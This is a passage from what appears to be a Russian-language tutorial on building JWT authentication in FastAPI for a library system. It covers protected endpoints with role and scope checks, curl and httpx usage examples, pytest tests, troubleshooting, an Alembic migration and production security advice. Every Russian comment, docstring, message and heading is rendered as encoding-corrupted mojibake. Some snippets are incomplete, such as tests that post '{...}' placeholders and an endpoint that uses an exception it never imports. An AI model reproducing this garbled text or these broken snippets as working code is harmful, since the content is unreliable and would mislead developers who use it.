        raise ValidationException(detail="–ù–µ–ª—å–∑—è —É–¥–∞–ª–∏—Ç—å —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç")
    
    auth_service = AuthService(db)
    user = await auth_service.get_user_by_id(user_id)
    
    if not user:
        raise NotFoundException(resource_name="user", resource_id=user_id)
    
    # –ú—è–≥–∫–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ
    user.deleted_at = datetime.now(timezone.utc)
    user.status = UserStatus.INACTIVE
    
    # –í—ã—Ö–æ–¥ —Å–æ –≤—Å–µ—Ö —Å–µ—Å—Å–∏–π
    await auth_service.logout_all_sessions(user_id)
    
    await db.commit()
    
    logger.warning(
        f"User deleted by admin: {user_id}",
        extra={
            "deleted_by": current_user["id"],
            "reason": reason,
            "user_email": user.email
        }
    )
    
    return {
        "success": True,
        "message": "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–¥–∞–ª–µ–Ω"
    }
```

### **9. –ü—Ä–∏–º–µ—Ä –∑–∞—â–∏—â–µ–Ω–Ω–æ–≥–æ endpoint**

```python
# app/api/v1/endpoints/protected_example.py
from fastapi import APIRouter, Depends
from typing import List
from sqlalchemy.ext.asyncio import AsyncSession

from app.api.deps import (
    get_db, get_current_user, get_current_active_user,
    get_current_verified_user, require_roles,
    require_admin, require_librarian, require_reader,
    require_scope
)
from app.models.user import UserRole

router = APIRouter(prefix="/protected", tags=["protected-examples"])

@router.get("/public")
async def public_endpoint():
    """–ü—É–±–ª–∏—á–Ω—ã–π endpoint - –¥–æ—Å—Ç—É–ø–µ–Ω –≤—Å–µ–º"""
    return {"message": "–≠—Ç–æ –ø—É–±–ª–∏—á–Ω—ã–π endpoint"}

@router.get("/authenticated")
async def authenticated_endpoint(
    current_user: dict = Depends(get_current_user)
):
    """Endpoint –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    return {
        "message": f"–ü—Ä–∏–≤–µ—Ç, {current_user['username']}!",
        "user": current_user
    }

@router.get("/active-users-only")
async def active_users_only(
    current_user: dict = Depends(get_current_active_user)
):
    """Endpoint —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    return {
        "message": f"–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, {current_user['username']}!",
        "user": current_user
    }

@router.get("/verified-users-only")
async def verified_users_only(
    current_user: dict = Depends(get_current_verified_user)
):
    """Endpoint —Ç–æ–ª—å–∫–æ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–Ω—ã–º email"""
    return {
        "message": f"–°–ø–∞—Å–∏–±–æ –∑–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ email, {current_user['username']}!",
        "user": current_user
    }

@router.get("/readers-only")
async def readers_only(
    current_user: dict = Depends(require_reader)
):
    """Endpoint —Ç–æ–ª—å–∫–æ –¥–ª—è —á–∏—Ç–∞—Ç–µ–ª–µ–π –∏ –≤—ã—à–µ"""
    return {
        "message": f"–ß–∏—Ç–∞—Ç–µ–ª—å—Å–∫–∏–π –¥–æ—Å—Ç—É–ø, {current_user['username']}!",
        "user": current_user
    }

@router.get("/librarians-only")
async def librarians_only(
    current_user: dict = Depends(require_librarian)
):
    """Endpoint —Ç–æ–ª—å–∫–æ –¥–ª—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∞—Ä–µ–π –∏ –≤—ã—à–µ"""
    return {
        "message": f"–ë–∏–±–ª–∏–æ—Ç–µ—á–Ω—ã–π –¥–æ—Å—Ç—É–ø, {current_user['username']}!",
        "user": current_user
    }

@router.get("/admins-only")
async def admins_only(
    current_user: dict = Depends(require_admin)
):
    """Endpoint —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤"""
    return {
        "message": f"–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–π –¥–æ—Å—Ç—É–ø, {current_user['username']}!",
        "user": current_user
    }

@router.get("/custom-role-check")
async def custom_role_check(
    current_user: dict = Depends(require_roles([UserRole.ADMIN, UserRole.LIBRARIAN]))
):
    """Endpoint —Å –∫–∞—Å—Ç–æ–º–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–æ–π —Ä–æ–ª–µ–π"""
    return {
        "message": f"–î–æ—Å—Ç—É–ø –¥–ª—è {current_user['role']}, {current_user['username']}!",
        "user": current_user
    }

@router.get("/api-token-scope")
async def api_token_scope(
    current_user: dict = Depends(require_scope("read:books"))
):
    """Endpoint —Ç—Ä–µ–±—É—é—â–∏–π –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π scope —É API —Ç–æ–∫–µ–Ω–∞"""
    return {
        "message": f"–î–æ—Å—Ç—É–ø —Å scope 'read:books', {current_user['username']}!",
        "auth_method": current_user.get("auth_method"),
        "scopes": current_user.get("scopes", [])
    }

@router.get("/user/{user_id}/profile")
async def get_user_profile(
    user_id: int,
    current_user: dict = Depends(get_current_active_user),
    db: AsyncSession = Depends(get_db)
):
    """Endpoint —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–æ—Ç—Ä–∏—Ç —Å–≤–æ–π –ø—Ä–æ—Ñ–∏–ª—å –∏–ª–∏ –∞–¥–º–∏–Ω"""
    from app.api.deps import require_self_or_admin
    
    # –ò—Å–ø–æ–ª—å–∑—É–µ–º –∫–∞—Å—Ç–æ–º–Ω—É—é –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å
    await require_self_or_admin(user_id)(current_user)
    
    # –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
    from app.services.auth_service import AuthService
    auth_service = AuthService(db)
    user = await auth_service.get_user_by_id(user_id)
    
    if not user:
        raise NotFoundException(resource_name="user", resource_id=user_id)
    
    return {
        "user_id": user.id,
        "username": user.username,
        "email": user.email if current_user["id"] == user_id or current_user["role"] in ["admin", "super_admin"] else None,
        "role": user.role,
        "status": user.status,
        "created_at": user.created_at
    }
```

---

## **üìñ –ü—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è API**

### **1. –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:**

```bash
curl -X POST "http://localhost:8000/api/v1/auth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@example.com",
    "username": "testuser",
    "password": "SecurePass123",
    "password_confirm": "SecurePass123",
    "full_name": "Test User"
  }'
```

**–û—Ç–≤–µ—Ç:**
```json
{
  "success": true,
  "message": "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞. –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ email.",
  "user_id": 1,
  "email": "user@example.com"
}
```

### **2. –í—Ö–æ–¥ –≤ —Å–∏—Å—Ç–µ–º—É:**

```bash
curl -X POST "http://localhost:8000/api/v1/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser&password=SecurePass123"
```

**–û—Ç–≤–µ—Ç:**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "expires_in": 900
}
```

### **3. –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ç–µ–∫—É—â–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ:**

```bash
curl -X GET "http://localhost:8000/api/v1/auth/me" \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"
```

**–û—Ç–≤–µ—Ç:**
```json
{
  "success": true,
  "data": {
    "id": 1,
    "email": "user@example.com",
    "username": "testuser",
    "role": "reader",
    "is_active": true,
    "is_email_verified": false
  }
}
```

### **4. –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ access —Ç–æ–∫–µ–Ω–∞:**

```bash
curl -X POST "http://localhost:8000/api/v1/auth/refresh" \
  -H "Content-Type: application/json" \
  -d '{"refresh_token": "YOUR_REFRESH_TOKEN"}'
```

### **5. –í—ã—Ö–æ–¥ –∏–∑ —Å–∏—Å—Ç–µ–º—ã:**

```bash
curl -X POST "http://localhost:8000/api/v1/auth/logout" \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"refresh_token": "YOUR_REFRESH_TOKEN"}'
```

### **6. –°–±—Ä–æ—Å –ø–∞—Ä–æ–ª—è:**

```bash
# –ó–∞–ø—Ä–æ—Å –Ω–∞ —Å–±—Ä–æ—Å
curl -X POST "http://localhost:8000/api/v1/auth/password/reset/request" \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com"}'

# –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Å–±—Ä–æ—Å–∞ (—Å —Ç–æ–∫–µ–Ω–æ–º –∏–∑ email)
curl -X POST "http://localhost:8000/api/v1/auth/password/reset/confirm" \
  -H "Content-Type: application/json" \
  -d '{
    "token": "RESET_TOKEN_FROM_EMAIL",
    "new_password": "NewSecurePass123",
    "new_password_confirm": "NewSecurePass123"
  }'
```

### **7. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ Python (httpx):**

```python
import httpx
import asyncio

async def test_auth():
    base_url = "http://localhost:8000/api/v1"
    
    async with httpx.AsyncClient() as client:
        # –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è
        register_response = await client.post(
            f"{base_url}/auth/register",
            json={
                "email": "test@example.com",
                "username": "testuser",
                "password": "SecurePass123",
                "password_confirm": "SecurePass123"
            }
        )
        print("Register:", register_response.json())
        
        # –í—Ö–æ–¥
        login_response = await client.post(
            f"{base_url}/auth/login",
            data={
                "username": "testuser",
                "password": "SecurePass123"
            }
        )
        tokens = login_response.json()
        access_token = tokens["access_token"]
        
        # –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞
        headers = {"Authorization": f"Bearer {access_token}"}
        me_response = await client.get(
            f"{base_url}/auth/me",
            headers=headers
        )
        print("Me:", me_response.json())

if __name__ == "__main__":
    asyncio.run(test_auth())
```

---

## **üß™ –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏**

### **–ü—Ä–∏–º–µ—Ä—ã —Ç–µ—Å—Ç–æ–≤:**

```python
# tests/test_auth.py
import pytest
from fastapi.testclient import TestClient
from app.main import app

client = TestClient(app)

def test_register_user():
    """–¢–µ—Å—Ç —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    response = client.post("/api/v1/auth/register", json={
        "email": "test@example.com",
        "username": "testuser",
        "password": "SecurePass123",
        "password_confirm": "SecurePass123",
        "full_name": "Test User"
    })
    assert response.status_code == 201
    data = response.json()
    assert data["success"] is True
    assert "user_id" in data

def test_register_duplicate_email():
    """–¢–µ—Å—Ç —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ —Å –¥—É–±–ª–∏—Ä—É—é—â–∏–º—Å—è email"""
    # –ü–µ—Ä–≤–∞—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è
    client.post("/api/v1/auth/register", json={
        "email": "duplicate@example.com",
        "username": "user1",
        "password": "SecurePass123",
        "password_confirm": "SecurePass123"
    })
    
    # –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
    response = client.post("/api/v1/auth/register", json={
        "email": "duplicate@example.com",
        "username": "user2",
        "password": "SecurePass123",
        "password_confirm": "SecurePass123"
    })
    assert response.status_code == 409  # Conflict

def test_login_success():
    """–¢–µ—Å—Ç —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—Ö–æ–¥–∞"""
    # –°–Ω–∞—á–∞–ª–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º
    client.post("/api/v1/auth/register", json={
        "email": "login@example.com",
        "username": "logintest",
        "password": "SecurePass123",
        "password_confirm": "SecurePass123"
    })
    
    # –ü–æ—Ç–æ–º –ª–æ–≥–∏–Ω–∏–º—Å—è
    response = client.post("/api/v1/auth/login", data={
        "username": "logintest",
        "password": "SecurePass123"
    })
    assert response.status_code == 200
    data = response.json()
    assert "access_token" in data
    assert "refresh_token" in data
    assert data["token_type"] == "bearer"

def test_login_wrong_password():
    """–¢–µ—Å—Ç –≤—Ö–æ–¥–∞ —Å –Ω–µ–≤–µ—Ä–Ω—ã–º –ø–∞—Ä–æ–ª–µ–º"""
    response = client.post("/api/v1/auth/login", data={
        "username": "logintest",
        "password": "WrongPassword"
    })
    assert response.status_code == 401  # Unauthorized

def test_protected_endpoint_without_token():
    """–¢–µ—Å—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –∑–∞—â–∏—â–µ–Ω–Ω–æ–º—É endpoint –±–µ–∑ —Ç–æ–∫–µ–Ω–∞"""
    response = client.get("/api/v1/auth/me")
    assert response.status_code == 401

def test_protected_endpoint_with_token():
    """–¢–µ—Å—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –∑–∞—â–∏—â–µ–Ω–Ω–æ–º—É endpoint —Å —Ç–æ–∫–µ–Ω–æ–º"""
    # –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∏ –≤—Ö–æ–¥
    client.post("/api/v1/auth/register", json={...})
    login_response = client.post("/api/v1/auth/login", data={...})
    token = login_response.json()["access_token"]
    
    # –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞
    response = client.get(
        "/api/v1/auth/me",
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200
    assert "data" in response.json()

def test_refresh_token():
    """–¢–µ—Å—Ç –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞"""
    # –ü–æ–ª—É—á–∞–µ–º refresh —Ç–æ–∫–µ–Ω
    login_response = client.post("/api/v1/auth/login", data={...})
    refresh_token = login_response.json()["refresh_token"]
    
    # –û–±–Ω–æ–≤–ª—è–µ–º access —Ç–æ–∫–µ–Ω
    response = client.post(
        "/api/v1/auth/refresh",
        json={"refresh_token": refresh_token}
    )
    assert response.status_code == 200
    assert "access_token" in response.json()

@pytest.mark.asyncio
async def test_rate_limiting():
    """–¢–µ—Å—Ç rate limiting –Ω–∞ endpoint –≤—Ö–æ–¥–∞"""
    # –î–µ–ª–∞–µ–º 6 –∑–∞–ø—Ä–æ—Å–æ–≤ –ø–æ–¥—Ä—è–¥ (–ª–∏–º–∏—Ç 5/–º–∏–Ω—É—Ç—É)
    for i in range(6):
        response = client.post("/api/v1/auth/login", data={
            "username": "test",
            "password": "wrong"
        })
        if i < 5:
            assert response.status_code in [401, 404]  # –û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        else:
            assert response.status_code == 429  # Too Many Requests
```

---

## **üîß –ß–∞—Å—Ç—ã–µ –æ—à–∏–±–∫–∏ –∏ —Ä–µ—à–µ–Ω–∏—è**

### **–û—à–∏–±–∫–∞: "Invalid token"**
**–ü—Ä–∏—á–∏–Ω–∞:** –¢–æ–∫–µ–Ω –∏—Å—Ç–µ–∫, –Ω–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç, –∏–ª–∏ –Ω–µ–≤–µ—Ä–Ω—ã–π SECRET_KEY  
**–†–µ—à–µ–Ω–∏–µ:** 
- –ü—Ä–æ–≤–µ—Ä—å—Ç–µ expiration time —Ç–æ–∫–µ–Ω–∞
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ SECRET_KEY –æ–¥–∏–Ω–∞–∫–æ–≤—ã–π –Ω–∞ –≤—Å–µ—Ö —Å–µ—Ä–≤–µ—Ä–∞—Ö
- –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ñ–æ—Ä–º–∞—Ç —Ç–æ–∫–µ–Ω–∞ (–¥–æ–ª–∂–µ–Ω –±—ã—Ç—å `Bearer <token>`)

### **–û—à–∏–±–∫–∞: "User not found" –ø—Ä–∏ –≤–∞–ª–∏–¥–Ω–æ–º —Ç–æ–∫–µ–Ω–µ**
**–ü—Ä–∏—á–∏–Ω–∞:** –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –±—ã–ª —É–¥–∞–ª–µ–Ω –∏–ª–∏ –¥–µ–∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –ø–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è —Ç–æ–∫–µ–Ω–∞  
**–†–µ—à–µ–Ω–∏–µ:** –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Å—Ç–∞—Ç—É—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –ë–î, –≤–æ–∑–º–æ–∂–Ω–æ –Ω—É–∂–Ω–æ –æ–±–Ω–æ–≤–∏—Ç—å —Ç–æ–∫–µ–Ω

### **–û—à–∏–±–∫–∞: "Rate limit exceeded"**
**–ü—Ä–∏—á–∏–Ω–∞:** –°–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤ –∑–∞ –∫–æ—Ä–æ—Ç–∫–æ–µ –≤—Ä–µ–º—è  
**–†–µ—à–µ–Ω–∏–µ:** 
- –ü–æ–¥–æ–∂–¥–∏—Ç–µ –∏—Å—Ç–µ—á–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ –æ–∫–Ω–∞
- –£–≤–µ–ª–∏—á—å—Ç–µ –ª–∏–º–∏—Ç –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö rate limiting
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—É—é —Å—Ç—Ä–∞—Ç–µ–≥–∏—é (–ø–æ IP –∏–ª–∏ –ø–æ user_id)

### **–û—à–∏–±–∫–∞: "Password validation failed"**
**–ü—Ä–∏—á–∏–Ω–∞:** –ü–∞—Ä–æ–ª—å –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è–º —Å–ª–æ–∂–Ω–æ—Å—Ç–∏  
**–†–µ—à–µ–Ω–∏–µ:** 
- –ú–∏–Ω–∏–º—É–º 8 —Å–∏–º–≤–æ–ª–æ–≤
- –î–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –∑–∞–≥–ª–∞–≤–Ω—ã–µ –∏ —Å—Ç—Ä–æ—á–Ω—ã–µ –±—É–∫–≤—ã
- –î–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ü–∏—Ñ—Ä—ã

### **–û—à–∏–±–∫–∞: "Email already exists"**
**–ü—Ä–∏—á–∏–Ω–∞:** –ü–æ–ø—ã—Ç–∫–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ —Å —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–º email  
**–†–µ—à–µ–Ω–∏–µ:** –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –¥—Ä—É–≥–æ–π email –∏–ª–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –¥–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ —Å–±—Ä–æ—Å –ø–∞—Ä–æ–ª—è

### **–û—à–∏–±–∫–∞: "2FA code invalid"**
**–ü—Ä–∏—á–∏–Ω–∞:** –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥ –∏–ª–∏ –∏—Å—Ç–µ–∫—à–µ–µ –≤—Ä–µ–º—è  
**–†–µ—à–µ–Ω–∏–µ:** 
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—Ä–µ–º—è –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä–æ–≤–∞–Ω–æ
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∞–∫—Ç—É–∞–ª—å–Ω—ã–π –∫–æ–¥ –∏–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞
- –ü—Ä–æ–≤–µ—Ä—å—Ç–µ, –Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –ª–∏ —É–∂–µ –∫–æ–¥ (–∫–æ–¥—ã –æ–¥–Ω–æ—Ä–∞–∑–æ–≤—ã–µ)

---

## **üóÑÔ∏è –ú–∏–≥—Ä–∞—Ü–∏–∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö**

–î–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ç–∞–±–ª–∏—Ü –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ Alembic:

```python
# migrations/versions/xxxx_add_auth_tables.py
"""Add authentication tables

Revision ID: xxxx
Revises: previous_revision
Create Date: 2024-01-01 12:00:00.000000
"""
from alembic import op
import sqlalchemy as sa
from sqlalchemy.dialects import postgresql

def upgrade():
    # –¢–∞–±–ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
    op.create_table(
        'users',
        sa.Column('id', sa.Integer(), nullable=False),
        sa.Column('email', sa.String(255), nullable=False),
        sa.Column('username', sa.String(100), nullable=False),
        sa.Column('hashed_password', sa.String(255), nullable=False),
        sa.Column('full_name', sa.String(200), nullable=True),
        sa.Column('role', sa.Enum('SUPER_ADMIN', 'ADMIN', 'LIBRARIAN', 'READER', 'GUEST', name='userrole'), nullable=False),
        sa.Column('status', sa.Enum('ACTIVE', 'INACTIVE', 'SUSPENDED', 'BANNED', name='userstatus'), nullable=False),
        sa.Column('is_email_verified', sa.Boolean(), nullable=False),
        sa.Column('email_verified_at', sa.DateTime(), nullable=True),
        sa.Column('failed_login_attempts', sa.Integer(), nullable=False),
        sa.Column('last_failed_login', sa.DateTime(), nullable=True),
        sa.Column('locked_until', sa.DateTime(), nullable=True),
        sa.Column('last_password_change', sa.DateTime(), nullable=False),
        sa.Column('two_factor_enabled', sa.Boolean(), nullable=False),
        sa.Column('two_factor_secret', sa.String(255), nullable=True),
        sa.Column('two_factor_backup_codes', sa.String(1000), nullable=True),
        sa.Column('last_login', sa.DateTime(), nullable=True),
        sa.Column('last_login_ip', sa.String(45), nullable=True),
        sa.Column('current_login_ip', sa.String(45), nullable=True),
        sa.Column('api_key', sa.String(100), nullable=True),
        sa.Column('api_key_enabled', sa.Boolean(), nullable=False),
        sa.Column('created_at', sa.DateTime(), nullable=False),
        sa.Column('updated_at', sa.DateTime(), nullable=True),
        sa.Column('deleted_at', sa.DateTime(), nullable=True),
        sa.PrimaryKeyConstraint('id')
    )
    
    # –ò–Ω–¥–µ–∫—Å—ã
    op.create_index('idx_user_email', 'users', ['email'], unique=True)
    op.create_index('idx_user_username', 'users', ['username'], unique=True)
    op.create_index('idx_user_status_role', 'users', ['status', 'role'])
    
    # –¢–∞–±–ª–∏—Ü–∞ —Å–µ—Å—Å–∏–π
    op.create_table(
        'user_sessions',
        sa.Column('id', sa.Integer(), nullable=False),
        sa.Column('session_token', sa.String(500), nullable=False),
        sa.Column('user_agent', sa.String(500), nullable=True),
        sa.Column('ip_address', sa.String(45), nullable=True),
        sa.Column('expires_at', sa.DateTime(), nullable=False),
        sa.Column('last_activity', sa.DateTime(), nullable=False),
        sa.Column('is_active', sa.Boolean(), nullable=False),
        sa.Column('user_id', sa.Integer(), nullable=False),
        sa.ForeignKeyConstraint(['user_id'], ['users.id'], ),
        sa.PrimaryKeyConstraint('id')
    )
    
    op.create_index('idx_session_token', 'user_sessions', ['session_token'], unique=True)
    
    # –¢–∞–±–ª–∏—Ü–∞ API —Ç–æ–∫–µ–Ω–æ–≤
    op.create_table(
        'api_tokens',
        sa.Column('id', sa.Integer(), nullable=False),
        sa.Column('name', sa.String(100), nullable=False),
        sa.Column('token', sa.String(100), nullable=False),
        sa.Column('scopes', sa.String(1000), nullable=True),
        sa.Column('last_used', sa.DateTime(), nullable=True),
        sa.Column('expires_at', sa.DateTime(), nullable=True),
        sa.Column('is_active', sa.Boolean(), nullable=False),
        sa.Column('created_at', sa.DateTime(), nullable=False),
        sa.Column('user_id', sa.Integer(), nullable=False),
        sa.ForeignKeyConstraint(['user_id'], ['users.id'], ),
        sa.PrimaryKeyConstraint('id')
    )
    
    op.create_index('idx_api_token', 'api_tokens', ['token'], unique=True)

def downgrade():
    op.drop_index('idx_api_token', table_name='api_tokens')
    op.drop_table('api_tokens')
    op.drop_index('idx_session_token', table_name='user_sessions')
    op.drop_table('user_sessions')
    op.drop_index('idx_user_status_role', table_name='users')
    op.drop_index('idx_user_username', table_name='users')
    op.drop_index('idx_user_email', table_name='users')
    op.drop_table('users')
```

**–ö–æ–º–∞–Ω–¥—ã –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –º–∏–≥—Ä–∞—Ü–∏—è–º–∏:**
```bash
# –°–æ–∑–¥–∞—Ç—å –Ω–æ–≤—É—é –º–∏–≥—Ä–∞—Ü–∏—é
alembic revision --autogenerate -m "Add authentication tables"

# –ü—Ä–∏–º–µ–Ω–∏—Ç—å –º–∏–≥—Ä–∞—Ü–∏–∏
alembic upgrade head

# –û—Ç–∫–∞—Ç–∏—Ç—å –ø–æ—Å–ª–µ–¥–Ω—é—é –º–∏–≥—Ä–∞—Ü–∏—é
alembic downgrade -1
```

---

## **üîí –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –¥–ª—è production**

### **1. –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å**

- **HTTPS –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω** - –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –ø–µ—Ä–µ–¥–∞–≤–∞–π—Ç–µ —Ç–æ–∫–µ–Ω—ã –ø–æ HTTP
- **SECRET_KEY** - –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è, –Ω–µ —Ö—Ä–∞–Ω–∏—Ç–µ –≤ –∫–æ–¥–µ
  ```python
  # .env
  SECRET_KEY=your-very-long-random-secret-key-minimum-32-bytes
  
  # –í –∫–æ–¥–µ
  SECRET_KEY: str = os.getenv("SECRET_KEY")
  if not SECRET_KEY or len(SECRET_KEY) < 32:
      raise ValueError("SECRET_KEY must be at least 32 bytes")
  ```

- **CORS** - –Ω–∞—Å—Ç—Ä–æ–π—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –¥–ª—è –≤–∞—à–µ–≥–æ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–∞
  ```python
  app.add_middleware(
      CORSMiddleware,
      allow_origins=["https://yourdomain.com"],  # –ù–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ "*" –≤ production
      allow_credentials=True,
      allow_methods=["GET", "POST", "PUT", "DELETE"],
      allow_headers=["*"],
  )
  ```

- **Rate Limiting** - –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–ª—è –∑–∞—â–∏—Ç—ã –æ—Ç –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞
- **–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ** - –ª–æ–≥–∏—Ä—É–π—Ç–µ –≤—Å–µ –ø–æ–ø—ã—Ç–∫–∏ –≤—Ö–æ–¥–∞ (–Ω–æ –Ω–µ –ø–∞—Ä–æ–ª–∏!)
- **–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥** - –æ—Ç—Å–ª–µ–∂–∏–≤–∞–π—Ç–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å (–º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ –Ω–µ—É–¥–∞—á–Ω—ã–µ –ø–æ–ø—ã—Ç–∫–∏ –≤—Ö–æ–¥–∞)

### **2. –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å**

